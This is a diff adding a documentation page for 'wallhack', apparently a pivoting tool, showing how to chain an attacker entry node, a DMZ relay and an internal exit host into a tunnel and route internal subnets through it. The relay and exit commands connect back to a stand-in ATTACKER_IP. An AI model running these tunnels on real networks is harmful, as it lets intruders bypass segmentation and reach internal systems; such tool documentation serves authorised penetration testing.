@@ -1,0 +1,41 @@
+---
+title: Multi-Hop
+description: Chain through intermediate relays to reach targets that cannot connect directly.
+order: 8
+---
+
+# Multi-Hop
+
+When deeper targets cannot reach the entry node directly, chain through intermediate relays to extend reach.
+
+{% steps %}
+{% step title="Attacker (Entry)" number=1 %}
+Listen for the first hop.
+
+{% codeblock code="wallhack entry --listen :443" /%}
+{% /step %}
+
+{% step title="DMZ Host (Relay)" number=2 %}
+Connect to the entry node and listen for the next hop.
+
+{% codeblock code="./wallhack relay --connect ATTACKER_IP:443 --listen :6565" /%}
+{% /step %}
+
+{% step title="Internal Host (Exit)" number=3 %}
+Connect back to the relay.
+
+{% codeblock code="./wallhack exit --connect DMZ_IP:6565" /%}
+{% /step %}
+
+{% step title="Configure Routes" number=4 %}
+Route target networks through the tunnel.
+
+```bash
+ip route add 10.0.0.0/24 dev tun0
+ip route add 10.1.0.0/24 dev tun0
+ip route add 10.2.0.0/24 dev tun0
+```
+{% /step %}
+{% /steps %}
+
+{% trafficflow flow="Your machine -> DMZ host -> Internal host -> Target (10.2.0.0/24)" label="Traffic Flow:" /%}
